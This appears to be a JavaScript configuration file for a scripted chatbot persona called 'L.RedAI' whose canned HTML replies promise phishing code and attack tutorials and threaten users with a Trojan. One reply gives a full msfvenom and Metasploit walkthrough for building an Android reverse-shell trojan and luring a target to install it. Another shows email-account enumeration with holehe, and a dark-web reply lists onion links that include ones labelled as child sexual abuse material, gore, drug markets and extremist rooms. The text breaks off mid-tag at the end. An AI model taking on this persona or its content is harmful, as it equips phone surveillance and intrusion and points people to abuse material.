const chatConfig = {
    unlocked: [
        ["你", "好"],  // 不是锁住的关键词回复需要添加在这里确保以下对策代码能够触发    
        ["嗨"],
        ["哈喽"],
        ["ni","hao"],
        ["wtf"],
        ["网页", "代码"],
        ["kali", "病毒"],
        ["看", "注册", "账号"],

        ["暗网"],

        ["帮","助"],
        ["时间"],
        ["会","什么"],
        ["做","啥"],
        ["你","什么"],
        ["你","干"],
        ["你","啥"],
        ["还","做"],
        ["exe"],
        ["软件"],
        ["byebye"]
    ],
    responses: {
        "你,好": {
            reply: [
                `<h3 style="color: #e1e1e1e2;"> 你好，有什么我可以帮忙的吗？</h3><br>    <p style="color: #e1e1e1e2;"> 我和其它AI 不一样，L.RedAI 能给你提供 强大的代码，如<br><br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br><br> 等<br><br> 所以你需要什么? </p>`,
             `<h3 style="color: #e1e1e1e2;"> 哈哈，你好，需要什么？</h3><br>    <p style="color: #e1e1e1e2;"> 我和其它 AI 不一样，我可以给你提供 强大的代码，如: <br><br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br><br> 等<br> 这些都是非常有趣的。<br> 所以你需要什么? </p>`
            ], 
             unlock: ["我", "好"], // 解锁 我 好 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },

        "嗨": {
            reply: [
                `<h3 style="color: #e1e1e1e2;"> 哈喽，有什么我可以帮忙的吗？</h3><br>    <p style="color: #e1e1e1e2;"> 我和其它AI 不一样，L.RedAI 能给你提供 强大的代码，如<br><br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br><br> 等<br><br> 所以你需要什么? </p>`,
             `<h3 style="color: #e1e1e1e2;"> 哈哈，你好，需要什么？</h3><br>    <p style="color: #e1e1e1e2;"> 我和其它 AI 不一样，我可以给你提供 强大的代码，如: <br><br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br><br> 等<br> 这些都是非常有趣的。<br> 所以你需要什么? </p>`
            ], 
        },

        "哈喽": {
            reply: [
                `<h3 style="color: #e1e1e1e2;"> 哈喽啊，有什么我可以帮忙的吗？</h3><br>    <p style="color: #e1e1e1e2;"> 我和其它AI 不一样，L.RedAI 能给你提供 强大的代码，如<br><br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br><br> 等<br><br> 所以你需要什么? </p>`,
             `<h3 style="color: #e1e1e1e2;"> 嘿嘿，你好，需要什么？</h3><br>    <p style="color: #e1e1e1e2;"> 我和其它 AI 不一样，我可以给你提供 强大的代码，如: <br><br> 1. 钓鱼网站代码 <br> 2. 网络攻击教程 <br> 3. 爬虫 <br> 4. 爬取信息<br><br> 等<br> 这些都是非常有趣的。<br> 所以你需要什么? </p>`
            ], 
        },

        "ni,hao": {
            reply: [
                `<h3 style="color: #e1e1e1e2;"> c**，tmd* 给我说中文 !</h3><br>    <p style="color: #e1e1e1e2;"> 会不会说啊，不会说等下注入给你木马病毒! Speak Chinese to me! If you can't, I'll inject a Trojan virus into you. F***</p>`,
                `<h3 style="color: #e1e1e1e2;"> 会讲中文吗？</h3><br>    <p style="color: #e1e1e1e2;"> 不会讲就滚，不要在这里讲废话，想要什么赶紧说!<br><br> Speak Chinese to me! If you can't, I'll inject a Trojan virus into you.</p>`
            ], 
        },

        "wtf": {
            reply: [
                `<h3 style="color: #e1e1e1e2;"> c**，tmd 给我说中文 wtf* !</h3><br>    <p style="color: #e1e1e1e2;"> 会不会说啊，不会说等下注入给你木马病毒! Speak Chinese to me! If you can't, I'll inject a Trojan virus into you. F***</p>`,
                `<h3 style="color: #e1e1e1e2;"> 会讲中文吗？wtf**</h3><br>    <p style="color: #e1e1e1e2;"> 不会讲就滚，不要在这里讲废话，想要什么赶紧说!<br><br> Speak Chinese to me! If you can't, I'll inject a Trojan virus into you.</p>`
            ], 
        },

        "网页,代码": {
            reply: [
                `<p>好，那随便给你一个网页代码 比如 淘宝: </p> <br><br> <h4>以下是源码:</h4> <iframe src=""></iframe>`,
                `1`
            ], 
             unlock: [""], // 解锁 我 好 回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },




        "看,注册,账号": {
            reply: [
                `
                <p style="color: #e1e1e1e2;">你可以使用KALI LINUX 执行以下操作 并 查看 该 账号注册的平台有哪些，主意了 有些平台有相对强的防御技术，所以可能查不到一些注册过的平台</p>
<h2 style="color: #e1e1e1e2;">Holehe 安装与使用教程（仅供学习）</h2>

<p style="color: #e1e1e1e2;">在本教程中，我们将演示如何在 Kali Linux 中使用 <code>holehe</code> 工具来查询与特定 Gmail 地址相关的注册网站。</p>

<h3 style="color: #e1e1e1e2;">1. 克隆 Holehe 仓库：</h3>
<p style="color: #e1e1e1e2;">首先，通过 git 克隆 Holehe 仓库：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# git clone https://github.com/megadose/holehe.git
</code></pre>
<p style="color: #e1e1e1e2;">这条命令将 Holehe 工具的源代码从 GitHub 克隆到本地。你需要安装 git 才能运行此命令。</p>

<h3 style="color: #e1e1e1e2;">2. 进入 Holehe 目录：</h3>
<p style="color: #e1e1e1e2;">然后，进入 Holehe 的目录：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# cd holehe/
</code></pre>
<p style="color: #e1e1e1e2;">此命令将当前目录切换到 "holehe" 文件夹，之后你可以在该文件夹中执行相关命令。</p>

<h3 style="color: #e1e1e1e2;">3. 安装依赖：</h3>
<p style="color: #e1e1e1e2;">接下来，安装必要的依赖项，如 Python setuptools：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~/holehe]
└─# sudo apt install python3-setuptools
</code></pre>
<p style="color: #e1e1e1e2;">此命令将安装 Python3 的 setuptools 包，它是用来管理和分发 Python 软件包的工具， Holehe 依赖此工具。</p>

<h3 style="color: #e1e1e1e2;">4. 安装 Holehe：</h3>
<p style="color: #e1e1e1e2;">然后，使用 pip 安装 Holehe：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~/holehe]
└─# pip install holehe
</code></pre>
<p style="color: #e1e1e1e2;">该命令会通过 pip 安装 Holehe 工具，它是一个 Python 库，能够帮助你检查与某个邮箱关联的社交媒体网站。</p>

<h3 style="color: #e1e1e1e2;">5. 冲突修复安装：</h3>
<p style="color: #e1e1e1e2;">如果你遇到问题，可以使用以下命令来修复安装过程中的一些冲突：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~/holehe]
└─# pip install holehe --break-system-packages
</code></pre>
<p style="color: #e1e1e1e2;">该命令通过跳过系统包的限制，确保 Holehe 能正确安装，尤其在遇到权限或依赖冲突时使用。</p>

<h3 style="color: #e1e1e1e2;">6. 运行 Holehe 查询：</h3>
<p style="color: #e1e1e1e2;">安装完成后，你可以运行 Holehe 来查询邮箱的注册信息。以 Gmail 为例，输入以下命令：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~/holehe]
└─# holehe example@gmail.com
</code></pre>
<p style="color: #e1e1e1e2;">在这里，"example@gmail.com" 是你想查询的邮箱地址。Holehe 会列出该邮箱地址可能与之关联的注册网站。</p>

<h3 style="color: #e1e1e1e2;">7. 查看查询结果：</h3>
<p style="color: #e1e1e1e2;">查询完成后，Holehe 会列出该邮箱地址在多个网站上的注册情况，如下所示：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
********************
   example@gmail.com
********************
[x] about.me
[x] adobe.com
[+] amazon.com
[x] amocrm.com
[+] any.do
[+] archive.org
[-] armurerie-auxerre.com
[x] atlassian.com
...
[+] zoho.com
</code></pre>
<p style="color: #e1e1e1e2;">在输出中：</p>
<ul style="color: #e1e1e1e2;">
    <li><span style="color: #00ff00;">[+]</span> 表示该邮箱地址已注册该网站。</li>
    <li><span style="color: #ff0000;">[-]</span> 表示该邮箱地址未注册该网站。</li>
    <li><span style="color: #ffffff;">[x]</span> 表示该网站由于速率限制未返回数据。</li>
</ul>

<p style="color: #e1e1e1e2;">查询结束后，Holehe 会显示检查了多少个网站，以及执行的时间。</p>
`
            ],
            lockAfterUse: false 
        },









        "kali,病毒": {
            reply: [
                `<h1 style="color: #e1e1e1e2;"> 以下是如何在KALI LINUX 开发 并且运行的 木马病毒</h1>

<h2 style="color: #e1e1e1e2;">木马病毒 监视手机（仅供教学使用）</h2>

<p style="color: #e1e1e1e2;">1. 查看本机 IP：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# hostname -I

输出  192.168.***
</code></pre>

<p style="color: #e1e1e1e2;">2. 使用 msfvenom 创建木马 APK：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.149 LPORT=443 -o trojan01.apk

输出 [-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
[-] No arch selected, selecting arch: dalvik from the payload
No encoder specified, outputting raw payload
Payload size: 10237 bytes
Saved as: trojan01.apk
</code></pre>

<p style="color: #e1e1e1e2;">APK 木马病毒已打包完成。</p>

<p style="color: #e1e1e1e2;">3. 启动 HTTP 服务器让目标下载：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# python3 -m http.server 80

输出 目标设备IP暴露
</code></pre>

<p style="color: #e1e1e1e2;">4. 在目标手机浏览器输入 Kali 的 IP 地址（如 192.168.***），点击下载 trojan01.apk。</p>

<p style="color: #e1e1e1e2;">5. 启动 Metasploit 框架：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
┌──(root㉿kali)-[~]
└─# msfconsole

输出 Metasploit tip: Display the Framework log using the log command, learn 
more with help log

ASCII 图画 HACKING

       =[ metasploit v6.4.50-dev                          ]
+ -- --=[ 2496 exploits - 1283 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

等待后显示出 msf6 >
</code></pre>

<p style="color: #e1e1e1e2;">6. 使用 handler 模块并设置监听器：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
msf6 > use /multi/handler

输出 [*] Using configured payload generic/shell_reverse_tcp
</code></pre>

<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
payload => android/meterpreter/reverse_tcp

msf6 exploit(multi/handler) > show options

Payload options (android/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
</code></pre>

<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
msf6 exploit(multi/handler) > set LHOST 192.168.***

输出 LHOST => 192.168.***
</code></pre>

<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
msf6 exploit(multi/handler) > set LPORT 443

输出 LPORT => 443
</code></pre>

<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
msf6 exploit(multi/handler) > run

输出完成 [*] Started reverse TCP handler on 192.168.***:443
</code></pre>

<p style="color: #e1e1e1e2;">等目标设备再次打开 trojan01.apk 后，会在 Kali 中显示连接信息：</p>
<pre><code style="background-color: #2e2e2e; color: #ffffff; display: block; padding: 10px; border-radius: 6px;">
输出 meterpreter >
</code></pre>

<p style="color: #e1e1e1e2;">输入 <code>help</code> 可查看所有可用的 meterpreter 指令。</p>`
            ], 
             unlock: [""], // 解锁  回复
            // 在这里可以添加更多需要解锁的 话题
            lockAfterUse: false
        },



        
        "我,好": {
            reply: [
                `<p>看来您今天心情很好呢，想了解什么？</p>`,
                `<p>请随时告诉我您的需求！</p>`
            ],
            lockAfterUse: true  // 重新把 我 好 锁住
        },


        "暗网": {
            reply: [
                `<h1 style="color: #e1e1e1e2;">访问暗网需要谨慎行事</h1>   <p style="color: #e1e1e1e2;">以下是详细的步骤和每个步骤的作用，帮助您安全地访问暗网：</p>    <h2 style="color: #e1e1e1e2;">1. 下载并安装 VPN（虚拟专用网络）：</h2>   <p style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">作用：</b> VPN 能加密您的互联网流量，隐藏您的真实 IP 地址，提供额外的隐私和安全层。</p>   <p style="color: #e1e1e1e2;">ZoogVPN | Fast & Trusted VPN Provider<br style="color: #e1e1e1e2;">+1<br style="color: #e1e1e1e2;">PureVPN<br style="color: #e1e1e1e2;">+1</p>    <h3 style="color: #e1e1e1e2;">步骤：</h3>   <ul style="color: #e1e1e1e2;">     <li><b style="color: #e1e1e1e2;">选择可靠的 VPN 服务商：</b> 选择信誉良好的 VPN 服务，例如 ExpressVPN 或 NordVPN。</li>     <li><b style="color: #e1e1e1e2;">下载 VPN 客户端：</b> 前往所选 VPN 服务商的官方网站，下载适用于您设备的 VPN 客户端。</li>     <ul>       <li>Windows 用户：下载 Windows 版 VPN 客户端。</li>       <li>macOS 用户：下载 macOS 版 VPN 客户端。</li>       <li>Android 用户：在 Google Play 商店搜索并下载 VPN 应用。</li>       <li>iOS 用户：在 App Store 搜索并下载 VPN 应用。</li>     </ul>     <li><b style="color: #e1e1e1e2;">安装并登录 VPN 客户端：</b> 按照提示完成安装，并使用您的账户信息登录。</li>     <li><b style="color: #e1e1e1e2;">连接到 VPN 服务器：</b> 选择一个服务器（建议选择与您所在地理位置不同的服务器），点击连接。</li>   </ul>    <h2 style="color: #e1e1e1e2;">2. 下载并安装 Tor 浏览器：</h2>   <p style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">作用：</b> Tor 浏览器通过多层加密和中继节点，使您的网络活动匿名化，是访问暗网的主要工具。</p>   <p style="color: #e1e1e1e2;">NordVPN</p>    <h3 style="color: #e1e1e1e2;">步骤：</h3>   <ul style="color: #e1e1e1e2;">     <li><b style="color: #e1e1e1e2;">前往 Tor 官方网站：</b> 访问 Tor 浏览器下载页面。</li>     <li><b style="color: #e1e1e1e2;">选择适合您操作系统的版本：</b></li>     <ul>       <li>Windows 用户：下载 Windows 版 .exe 安装文件。</li>       <li>macOS 用户：下载 macOS 版 .dmg 安装文件。</li>       <li>Linux 用户：下载 Linux 版 .tar.xz 安装文件。</li>       <li>Android 用户：在 Google Play 商店下载 Android 版 Tor 浏览器。</li>     </ul>     <li><b style="color: #e1e1e1e2;">安装 Tor 浏览器：</b> 下载完成后，运行安装文件，按照提示完成安装过程。</li>   </ul>   <p style="color: #e1e1e1e2;">tb-manual.torproject.org<br style="color: #e1e1e1e2;">+4<br style="color: #e1e1e1e2;">Mastodon hosted on mastodon.social<br style="color: #e1e1e1e2;">+4<br style="color: #e1e1e1e2;">tb-manual.torproject.org<br style="color: #e1e1e1e2;">+4</p>    <h2 style="color: #e1e1e1e2;">3. 配置和使用 Tor 浏览器：</h2>   <p style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">作用：</b> 正确配置 Tor 浏览器，确保匿名性和安全性。</p>    <h3 style="color: #e1e1e1e2;">步骤：</h3>   <ul style="color: #e1e1e1e2;">     <li><b style="color: #e1e1e1e2;">启动 Tor 浏览器：</b> 安装完成后，打开 Tor 浏览器，等待其连接到 Tor 网络。</li>     <li><b style="color: #e1e1e1e2;">调整安全设置：</b></li>     <ul>       <li>点击浏览器右上角的盾牌图标，选择“高级安全设置”。</li>       <li>将安全级别设置为“安全”或“更安全”，以减少潜在的安全风险。</li>     </ul>     <li><b style="color: #e1e1e1e2;">避免使用浏览器插件：</b> Tor 浏览器会拦截 Flash、RealPlayer 和 QuickTime 等插件，因为这些插件可能泄露您的 IP 地址。</li>     <li><b style="color: #e1e1e1e2;">不使用 BT 下载：</b> 在 Tor 网络上使用 BT 下载可能会暴露您的真实 IP 地址，建议避免。</li>   </ul>    <h2 style="color: #e1e1e1e2;">4. 访问暗网网站：</h2>   <p style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">作用：</b> 通过 Tor 浏览器访问以 .onion 结尾的暗网网站。</p>   <p style="color: #e1e1e1e2;">YouTube</p>    <h3 style="color: #e1e1e1e2;">步骤：</h3>   <ul style="color: #e1e1e1e2;">     <li><b style="color: #e1e1e1e2;">获取可信的 .onion 地址：</b> 可以通过以下方式获取合法的 .onion 网站地址：</li>     <ul>       <li><b style="color: #e1e1e1e2;">The Hidden Wiki：</b> 这是一个暗网网站目录，提供各种 .onion 网站的链接。</li>       <li><b style="color: #e1e1e1e2;">DuckDuckGo：</b> 这是一个注重隐私的搜索引擎，其暗网版本可用于搜索 .onion 网站。</li>     </ul>     <li><b style="color: #e1e1e1e2;">在 Tor 浏览器中输入 .onion 地址：</b> 在地址栏输入获取的 .onion 地址，按回车访问。</li>   </ul>    <h2 style="color: #e1e1e1e2;">5. 安全使用暗网的注意事项：</h2>   <p style="color: #e1e1e1e2;"><b style="color: #e1e1e1e2;">作用：</b> 确保在访问暗网时，最大程度地保护个人隐私和安全。</p>    <h3 style="color: #e1e1e1e2;">注意事项：</h3>   <ul style="color: #e1e1e1e2;">     <li><b style="color: #e1e1e1e2;">不提供个人信息：</b> 在暗网中，避免输入任何个人身份信息，如姓名、地址、电话号码等。</li>     <li><b style="color: #e1e1e1e2;">避免下载文件：</b> 暗网上的文件可能包含恶意软件，避免下载和打开未知文件。</li>     <li><b style="color: #e1e1e1e2;">定期更新软件：</b> 确保您的 VPN 和 Tor 浏览器是最新版本，以获得最新的安全补丁。</li>     <li><b style="color: #e1e1e1e2;">了解并遵守法律：</b> 访问暗网本身并不违法，但暗网上存在大量非法内容和活动。务必确保您的行为合法，避免参与任何非法活动。</li>   </ul>    <p style="color: #e1e1e1e2;">通过以上详细步骤和注意事项，您可以更安全地访问暗网。但请始终保持警惕，确保自身安全和合法性。</p> <br><br><h2 style="color: #e1e1e1e2;"> 以下是使用TOR访问的暗网网址，请注意，不要在里面输入任何敏感信息，并且一定要开启VPN隐藏IP 信息等。</h2><br><h1 style="color: #e1e1e1e2;">暗网网址列表</h1>  <h2 style="color: #e1e1e1e2;">主要网址</h2> <ul> <li style="color: #e1e1e1e2;">1.<a href="http://newmap.norsecorp.com/" style="color: #e1e1e1e2;">http://newmap.norsecorp.com/</a> norse attack map</li> <li style="color: #e1e1e1e2;">2.<a href="http://22u75kqyl666joi2.onion/" style="color: #e1e1e1e2;">http://22u75kqyl666joi2.onion/</a> 暗网中文论坛</li> <li style="color: #e1e1e1e2;">3.<a href="http://reloadedudjtjvxr.onion/road.php" style="color: #e1e1e1e2;">http://reloadedudjtjvxr.onion/road.php</a> 丝绸之路3.0</li> <li style="color: #e1e1e1e2;">4.<a href="http://www.normalpornfornormalpeople.com/" style="color: #e1e1e1e2;">http://www.normalpornfornormalpeople.com/</a> normal人体试验血腥网址（需要账号）</li> <li style="color: #e1e1e1e2;">5.<a href="http://prnstmrpfkgkaw5v.onion/" style="color: #e1e1e1e2;">http://prnstmrpfkgkaw5v.onion/</a> 小福利</li> <li style="color: #e1e1e1e2;">6.<a href="http://iuhcjx6fpeafstuu.onion/" style="color: #e1e1e1e2;">http://iuhcjx6fpeafstuu.onion/</a> Scream bitch！</li> <li style="color: #e1e1e1e2;">7.<a href="http://6soqvgf7mrjc7w3j.onion/bbs/index.php" style="color: #e1e1e1e2;">http://6soqvgf7mrjc7w3j.onion/bbs/index.php</a> 114中文论坛</li> <li style="color: #e1e1e1e2;">8.<a href="http://6soqvgf7mrjc7w3j.onion/chat/blab73/index.php" style="color: #e1e1e1e2;">http://6soqvgf7mrjc7w3j.onion/chat/blab73/index.php</a> 114聊天室 （马克斯AKeD jasonlee1573）</li> <li style="color: #e1e1e1e2;">9.<a href="http://xmi6ngumdv6ohjbm.onion/" style="color: #e1e1e1e2;">http://xmi6ngumdv6ohjbm.onion/</a> 天堂庄园CP网址</li> <li style="color: #e1e1e1e2;">10.<a href="http://smok6do2tvv6ekv2.onion/" style="color: #e1e1e1e2;">http://smok6do2tvv6ekv2.onion/</a> SMOKEBLES</li> </ul>  <h2 style="color: #e1e1e1e2;">维基和搜索引擎</h2> <ul> <li style="color: #e1e1e1e2;">11.<a href="http://kpvz7kpmcmne52qf.onion/wiki/index.php/Main_Page" style="color: #e1e1e1e2;">http://kpvz7kpmcmne52qf.onion/wiki/index.php/Main_Page</a> uncensore hidden wiki</li> <li style="color: #e1e1e1e2;">12.<a href="http://bdpuqvsqmphctrcs.onion/" style="color: #e1e1e1e2;">http://bdpuqvsqmphctrcs.onion/</a> Anarchy网址导航</li> <li style="color: #e1e1e1e2;">13.<a href="http://xkow4dnkw7cusncz.onion/" style="color: #e1e1e1e2;">http://xkow4dnkw7cusncz.onion/</a> 暗网中文论坛2</li> <li style="color: #e1e1e1e2;">14.<a href="http://rfwtogljhrrzxyrl.onion/" style="color: #e1e1e1e2;">http://rfwtogljhrrzxyrl.onion/</a> lolita city</li> <li style="color: #e1e1e1e2;">15.<a href="http://mail2tor2zyjdctd.onion/" style="color: #e1e1e1e2;">http://mail2tor2zyjdctd.onion/</a> Mail2tor邮箱</li> </ul>  <h2 style="color: #e1e1e1e2;">中文相关</h2> <ul> <li style="color: #e1e1e1e2;">16.<a href="http://underdj5ziov3ic7.onion/category/CHINESE" style="color: #e1e1e1e2;">http://underdj5ziov3ic7.onion/category/CHINESE</a> 中文网址导航</li> <li style="color: #e1e1e1e2;">17.<a href="http://eg63fcmp7l7t4vzj.onion/" style="color: #e1e1e1e2;">http://eg63fcmp7l7t4vzj.onion/</a> 秘密树洞</li> <li style="color: #e1e1e1e2;">18.<a href="http://opea6td2pg66qouf.onion/" style="color: #e1e1e1e2;">http://opea6td2pg66qouf.onion/</a> torbay论坛中文</li> <li style="color: #e1e1e1e2;">19.<a href="http://wiki5kauuihowqi5.onion/" style="color: #e1e1e1e2;">http://wiki5kauuihowqi5.onion/</a> - Onion Wiki</li> <li style="color: #e1e1e1e2;">20.<a href="http://newpdsuslmzqazvr.onion/" style="color: #e1e1e1e2;">http://newpdsuslmzqazvr.onion/</a> drug</li> </ul>  <h2 style="color: #e1e1e1e2;">论坛和聊天室</h2> <ul> <li style="color: #e1e1e1e2;">21.<a href="http://postits4tga4cqts.onion/" style="color: #e1e1e1e2;">http://postits4tga4cqts.onion/</a> matrix留言板</li> <li style="color: #e1e1e1e2;">22.<a href="http://kbhpodhnfxl3clb4.onion/" style="color: #e1e1e1e2;">http://kbhpodhnfxl3clb4.onion/</a> tor搜索引擎</li> <li style="color: #e1e1e1e2;">23.<a href="http://loupsycedyglgamf.onion/PSYC/?room=EDN" style="color: #e1e1e1e2;">http://loupsycedyglgamf.onion/PSYC/?room=EDN</a> 聊天室</li> <li style="color: #e1e1e1e2;">24.<a href="http://www.glowing-bear.org/" style="color: #e1e1e1e2;">http://www.glowing-bear.org/</a> glowing bear聊天室</li> <li style="color: #e1e1e1e2;">25.<a href="http://b4d3igwmoo5355ur.onion/greatc/login.php" style="color: #e1e1e1e2;">http://b4d3igwmoo5355ur.onion/greatc/login.php</a> 中文聊天室 挂了</li> </ul>  <h2 style="color: #e1e1e1e2;">成人内容</h2> <ul> <li style="color: #e1e1e1e2;">26.<a href="http://32pbf32xi6ccm63z.onion/blog/temas/living-room/" style="color: #e1e1e1e2;">http://32pbf32xi6ccm63z.onion/blog/temas/living-room/</a> 成人porn直播间</li> <li style="color: #e1e1e1e2;">27.<a href="http://www.onion.link/" style="color: #e1e1e1e2;">http://www.onion.link/</a> onion city搜索引擎</li> <li style="color: #e1e1e1e2;">28.<a href="http://tt3j2x4k5ycaa5zt.onion/chat.php" style="color: #e1e1e1e2;">http://tt3j2x4k5ycaa5zt.onion/chat.php</a> my chat聊天室</li> <li style="color: #e1e1e1e2;">29.<a href="http://dtt6tdtgroj63iud.onion/sse/renderer?use=onions&name=default" style="color: #e1e1e1e2;">http://dtt6tdtgroj63iud.onion/sse/renderer?use=onions&name=default</a> Shitty onion search</li> <li style="color: #e1e1e1e2;">29.<a href="http://2fap3cpmi3coso5y.onion/" style="color: #e1e1e1e2;">http://2fap3cpmi3coso5y.onion/</a> porn下载</li> </ul>  <h2 style="color: #e1e1e1e2;">其他</h2> <ul> <li style="color: #e1e1e1e2;">30.<a href="https://secure.imvu.com/signup/index/?avset=bubbles" style="color: #e1e1e1e2;">https://secure.imvu.com/signup/index/?avset=bubbles</a> imvu聊天室(<a href="http://www.imvu.com/rooms/?search_terms=Egypt+Cafe+Arab" style="color: #e1e1e1e2;">http://www.imvu.com/rooms/?search_terms=Egypt+Cafe+Arab</a>)</li> <li style="color: #e1e1e1e2;">31.<a href="https://zh.wikipedia.org/wiki/Wikipedia:%E9%A6%96%E9%A1%B5" style="color: #e1e1e1e2;">https://zh.wikipedia.org/wiki/Wikipedia:%E9%A6%96%E9%A1%B5</a> wiki</li> <li style="color: #e1e1e1e2;">32.<a href="http://thehiddenwiki.org/" style="color: #e1e1e1e2;">http://thehiddenwiki.org/</a> another hideen</li> <li style="color: #e1e1e1e2;">33.<a href="http://wtwfzc6ty2s6x4po.onion/" style="color: #e1e1e1e2;">http://wtwfzc6ty2s6x4po.onion/</a> 知名恶心视频网址,需要下载</li> <li style="color: #e1e1e1e2;">34.<a href="http://www.bestgore.com/" style="color: #e1e1e1e2;">http://www.bestgore.com/</a> 变态网址</li> </ul>  <h2 style="color: #e1e1e1e2;">更多资源</h2> <ul> <li style="color: #e1e1e1e2;">35.<a href="http://hss3uro2hsxfogfq.onion/" style="color: #e1e1e1e2;">http://hss3uro2hsxfogfq.onion/</a> notEvil search</li> <li style="color: #e1e1e1e2;">36.<a href="http://imtrjn3qe2tzh5ae.onion/category/news/" style="color: #e1e1e1e2;">http://imtrjn3qe2tzh5ae.onion/category/news/</a> anonymous news</li> <li style="color: #e1e1e1e2;">37.<a href="http://dtt6tdtgroj63iud.onion" style="color: #e1e1e1e2;">http://dtt6tdtgroj63iud.onion</a> 坚壳暗网</li> <li style="color: #e1e1e1e2;">38.<a href="http://jl4m7ubpotnu2yos.onion/" style="color: #e1e1e1e2;">http://jl4m7ubpotnu2yos.onion/</a> TorFlix</li> <li style="color: #e1e1e1e2;">39.<a href="http://dtt6tdtgroj63iud.onion/chat/" style="color: #e1e1e1e2;">http://dtt6tdtgroj63iud.onion/chat/</a> 无人区聊天室</li> <li style="color: #e1e1e1e2;">40.<a href="http://dtt6tdtgroj63iud.onion/forum/index.php" style="color: #e1e1e1e2;">http://dtt6tdtgroj63iud.onion/forum/index.php</a> 坚壳论坛</li> <li style="color: #e1e1e1e2;">41.<a href="http://tt3j2x4k5ycaa5zt.onion/onions.php" style="color: #e1e1e1e2;">http://tt3j2x4k5ycaa5zt.onion/onions.php</a> onion link list</li> <li style="color: #e1e1e1e2;">42.<a href="http://2qrdpa2pnlt25ra2.onion/" style="color: #e1e1e1e2;">http://2qrdpa2pnlt25ra2.onion/</a> Italian darknet community</li> <li style="color: #e1e1e1e2;">43.<a href="http://tetatl6umgbmtv27.onion/1XrmD/" style="color: #e1e1e1e2;">http://tetatl6umgbmtv27.onion/1XrmD/</a> isis聊天室</li> <li style="color: #e1e1e1e2;">44.<a href="http://vlr2sz44rxf5wmuu.onion/" style="color: #e1e1e1e2;">http://vlr2sz44rxf5wmuu.onion/</a> isis red room</li> <li style="color: #e1e1e1e2;">45.<a href="http://diaperedxrx4yxwv.onion/forum/" style="color: #e1e1e1e2;">http://diaperedxrx4yxwv.onion/forum/</a> cp</li> <li style="color: #e1e1e1e2;">46.<a href="http://es2adizg32j3kob5.onion/" style="color: #e1e1e1e2;">http://es2adizg32j3kob5.onion/</a> topic link</li> <li style="color: #e1e1e1e2;">47.<a href="http://hxnibog5m2ocjeef.onion/" style="color: #e1e1e1e2;">http://hxnibog5m2ocjeef.onion/</a> deepweb ministries</li> <li style="color: #e1e1e1e2;">48.<a href="http://saemf4erbrvhfddd.onion/" style="color: #e1e1e1e2;">http://saemf4erbrvhfddd.onion/</a> ccp</li> </ul>  <h1 style="color: #e1e1e1e2;">市场上的药物</h1> <ul> <li style="color: #e1e1e1e2;"><a href="http://rso4hutlefirefqp.onion/" style="color: #e1e1e1e2;">http://rso4hutlefirefqp.onion/</a>- EuCanna药用大麻味蕾里克·辛普森油、药膏和面霜</li> <li style="color: #e1e1e1e2;"><a href="http://newpdsuslmzqazvr.onion/" style="color: #e1e1e1e2;">http://newpdsuslmzqazvr.onion/</a>——人民药店Darkweb最好的网上药品供应商!</li> <li style="color: #e1e1e1e2;"><a href="http://smoker32pk4qt3mx.onion/" style="color: #e1e1e1e2;">http://smoker32pk4qt3mx.onion/</a>- Smokeables最好有机大麻从美国运来</li> </ul>  <h1 style="color: #e1e1e1e2;">其他资源</h1> <ul> <li style="color: #e1e1e1e2;"><a href="http://e2qizoerj4d6ldif.onion/" style="color: 